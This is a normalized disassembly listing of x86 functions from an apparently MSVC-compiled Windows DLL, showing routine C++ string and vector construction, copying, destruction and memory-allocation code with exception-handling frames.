mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100042c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b2c9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
add ecx 0x4
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
push ecx
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10004330
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b9f7
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] r--data
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ecx ] r--data
mov [ ecx + 0x30 ] 0xf
mov [ ecx + 0x2c ] 0x0
mov [ ecx + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ ecx + 0x34 ] 0x0
mov [ ecx + 0x38 ] 0x0
mov [ ecx + 0x3c ] 0x0
mov [ ebp - 0x4 ] 0x4
mov [ ecx + 0x40 ] 0x0
mov [ ecx + 0x44 ] 0x0
mov [ ecx + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x5
mov [ ecx + 0x4c ] 0x0
mov [ ecx + 0x50 ] 0x0
mov [ ecx + 0x54 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10004400
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10004530
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10004430
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ba33
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100044a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ba33
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10004530
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ba97
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push [ esi + 0x50 ]
push eax
call sub_10004c10
push [ esi + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] 0x0
mov [ esi + 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push [ esi + 0x44 ]
push eax
call sub_10004c10
push [ esi + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x40 ] 0x0
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x30 ] 0x10
jb r-xdata
push [ esi + 0x38 ]
push eax
call sub_10004c10
push [ esi + 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x30 ] 0xf
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x5
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push [ esi + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10004670
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bad9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_10004710
mov [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1c ]
mov [ ebp - 0x10 ] 0x1
cmp esi eax
je r-xdata
lea eax [ edi + 0x34 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_100049b0
lea ecx [ edi + 0x40 ]
push ecx
lea ecx [ esi + 0x24 ]
call sub_100049b0
lea ecx [ edi + 0x4c ]
push ecx
lea ecx [ esi + 0x30 ]
call sub_100049b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_100018b0
sub_10004710
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bb29
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ecx + 0x18 ] 0x0
mov [ ecx + 0x1c ] 0x0
mov [ ecx + 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ecx + 0x24 ] 0x0
mov [ ecx + 0x28 ] 0x0
mov [ ecx + 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ecx + 0x30 ] 0x0
mov [ ecx + 0x34 ] 0x0
mov [ ecx + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_100047b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bb79
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push [ esi + 0x34 ]
push eax
call sub_10004c10
push [ esi + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x30 ] 0x0
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push [ esi + 0x28 ]
push eax
call sub_10004c10
push [ esi + 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ esi + 0x1c ]
push eax
call sub_10004c10
push [ esi + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100048b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bba0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
sub edx [ edi ]
mov eax 0x2aaaaaab
imul edx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
push eax
call sub_10004ba0
test al al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ esi ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
call sub_10004cc0
add esp 0xc
mov [ esi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
sub_10004970
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
push [ esi + 0x4 ]
push eax
call sub_10004c10
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
sub_100049b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bbc0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x18 ] edi
mov ebx [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov ecx [ ebx + 0x4 ]
cmp eax ecx
jne r-xdata
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp + 0x8 ] eax
mov esi [ edi ]
mov ecx [ edi + 0x4 ]
sub ecx esi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov ecx edi
call sub_10004b50
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
cmp [ ebp + 0x8 ] eax
ja r-xdata
push esi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10004c50
add esp 0x4
push [ edi + 0x4 ]
push eax
call sub_10004c10
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax + eax * 2 ]
mov eax [ edi ]
lea eax [ eax + ecx * 8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
mov ecx [ ebx ]
lea esi [ ecx + eax * 8 ]
push [ edi ]
mov edx esi
call sub_10004c50
add esp 0x4
push [ ebp + 0x8 ]
push ecx
push [ edi + 0x4 ]
mov edx [ ebx + 0x4 ]
mov ecx esi
call sub_10004cc0
add esp 0xc
jmp r-xdata
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
push eax
mov ecx edi
call sub_10004ba0
test al al
je r-xdata
push [ edi + 0x4 ]
push esi
call sub_10004c10
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push ecx
push [ edi ]
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10004cc0
add esp 0xc
mov [ edi + 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_10004b50
push ebx
push esi
push edi
mov edi ecx
mov ebx [ edi + 0x4 ]
mov esi [ edi ]
cmp esi ebx
je r-xdata
mov eax esi
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
mov edi edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x18
cmp esi ebx
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ edi ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_10004ba0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
test eax eax
jne r-xdata
cmp eax 0xaaaaaaa
ja r-xdata
xor al al
pop esi
pop ebp
retn 0x4
push r--data
call sub_1003c5be
push edi
lea edi [ eax + eax * 2 ]
shl edi 0x3
push edi
call sub_1003cdeb
add esp 0x4
test eax eax
je r-xdata
call sub_1003c58d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
add eax edi
mov [ esi + 0x8 ] eax
mov al 0x1
pop edi
pop esi
pop ebp
retn 0x4
sub_10004c10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
nop
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x18
cmp esi edi
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_10004c50
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp edi esi
je r-xdata
add esi 0x18
add edi 0x18
cmp esi ebx
jne r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_100018b0
sub_10004c90
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
pop ebp
retn 0x4
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10004cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bbe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov esi ecx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
call sub_10004d60
add edi 0x18
mov [ ebp + 0x8 ] edi
add esi 0x18
mov [ ebp - 0x18 ] esi
jmp r-xdata
cmp esi ebx
je r-xdata
sub_10004d34
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_1003e35b
int3
mov edi edi
push esi
call sub_10004c90
add esi 0x18
cmp esi edi
jne r-xdata
sub_10004d60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
push 0xffffffff
push 0x0
push [ ebp + 0xc ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] 0x0
call sub_100018b0
sub_10004dd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc13
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x44
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub esp 0x3c
mov ecx esp
mov [ ebp - 0x14 ] esp
push ecx
mov ecx edi
call sub_10004670
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_100340f0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10004e70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc51
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x50 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x54 ] esi
jne r-xdata
mov edx [ rw-data ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov ecx 0xb
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ecx edx
lea edi [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
mov ecx esi
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4c ]
push eax
mov ecx ebx
mov [ ebp - 0x50 ] 0x1
call sub_10004670
mov [ ebp - 0x4 ] 0x1
mov ecx esi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4c ]
call sub_100047b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
sub_10004f60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] 0x0
mov eax [ edi + 0x10 ]
inc eax
je r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov eax esi
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
push edi
push esi
call sub_1003c640
add esp 0xc
jmp r-xdata
sub_10005010
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
push esi
push edi
call sub_1003c640
add esp 0xc
jmp r-xdata
sub_100050b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0xc ]
mov eax [ edi + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_1003c5ec
mov ebx [ ebp + 0x10 ]
sub eax ecx
mov ecx [ esi + 0x10 ]
cmp eax ebx
mov [ ebp + 0x8 ] ecx
cmovb ebx eax
or eax 0xffffffff
sub eax ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_1003c5be
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea eax [ ecx + ebx ]
mov ecx esi
push 0x0
push eax
call sub_10001bb0
test al al
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edi [ edi ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx ebx
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
mov eax [ ebp + 0xc ]
add eax edi
push ebx
push eax
mov eax [ esi + 0x10 ]
add eax ecx
push eax
call sub_1003dc80
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop edi
mov [ eax + ecx ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
sub_10005170
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_10004530
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100051d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bc13
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0xb4
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp [ edi + 0x5c ] 0x2
sete cl
xor eax eax
cmp [ edi + 0x58 ] 0x1
push ecx
sete al
mov ecx edi
push eax
sub esp 0x3c
mov eax esp
mov [ ebp - 0x14 ] esp
push eax
call sub_10004670
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10024f10
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10005280
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bcdd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x520 ] ecx
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x528 ] 0x0
cmp [ rw-data ] 0x0
mov edi [ InterlockedExchange@IAT ]
mov [ ebp - 0x52c ] esi
jne r-xdata
mov ebx [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0xc
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0x524 ] eax
jne r-xdata
mov ecx 0xd
call sub_100382c0
push eax
push rw-data
call edi
mov eax [ ebp - 0x520 ]
mov edi [ rw-data ]
push [ eax + 0x5c ]
lea eax [ ebp - 0x4e0 ]
push ebx
push eax
call sub_10005560
mov [ esi + 0x14 ] 0xf
add esp 0xc
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x4e0 ] 0x0
jne r-xdata
mov ecx 0xe
call sub_100382c0
push eax
push rw-data
call edi
lea ecx [ ebp - 0x4e0 ]
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x4e0 ]
mov ecx esi
push eax
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp - 0x520 ]
mov [ ebp - 0x528 ] 0x1
cmp [ ebx + 0x58 ] 0x1
cmove edi [ ebp - 0x524 ]
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push edi
mov ecx esi
call sub_10005470
lea eax [ ebp - 0x51c ]
mov ecx ebx
push eax
call sub_10004670
mov [ ebp - 0x4 ] 0x1
mov ecx esi
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x51c ]
call sub_100047b0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
sub_10005430
